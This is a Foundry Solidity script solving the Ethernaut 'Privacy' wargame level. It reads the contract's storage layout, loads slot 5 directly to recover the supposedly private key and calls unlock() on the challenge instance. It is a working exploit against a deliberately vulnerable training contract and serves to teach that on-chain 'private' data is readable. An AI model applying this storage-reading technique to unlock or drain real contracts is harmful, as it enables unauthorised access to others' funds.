// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {Privacy} from "../../challenge-contracts/12-Privacy.sol";

contract PrivacySolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x131c3249e115491E83De375171767Af07906eA36;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Run command `forge inspect Privacy storage-layout --pretty` to get storage information:
        /*
        | Name         | Type       | Slot | Offset | Bytes | Contract                                   |
        |--------------|------------|------|--------|-------|--------------------------------------------|
        | locked       | bool       | 0    | 0      | 1     | challenge-contracts/12-Privacy.sol:Privacy |
        | ID           | uint256    | 1    | 0      | 32    | challenge-contracts/12-Privacy.sol:Privacy |
        | flattening   | uint8      | 2    | 0      | 1     | challenge-contracts/12-Privacy.sol:Privacy |
        | denomination | uint8      | 2    | 1      | 1     | challenge-contracts/12-Privacy.sol:Privacy |
        | awkwardness  | uint16     | 2    | 2      | 2     | challenge-contracts/12-Privacy.sol:Privacy |
        | data         | bytes32[3] | 3    | 0      | 96    | challenge-contracts/12-Privacy.sol:Privacy |
        */

        // Step 2: Load the password variable directly from the storage slot using vm.load;
        //         The base slot for the data array is 3, and since each bytes32 takes up one slot, data[2] is at slot 3 + 2 = 5.
        bytes32 key32 = vm.load(challengeInstance, bytes32(uint256(5)));
        bytes16 key = bytes16(key32);
        console2.logBytes16(key);

        // Step 3: Use retrieved password to unlock the vault;
        Privacy privacy = Privacy(challengeInstance);
        privacy.unlock(key);

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(12));
    }
}
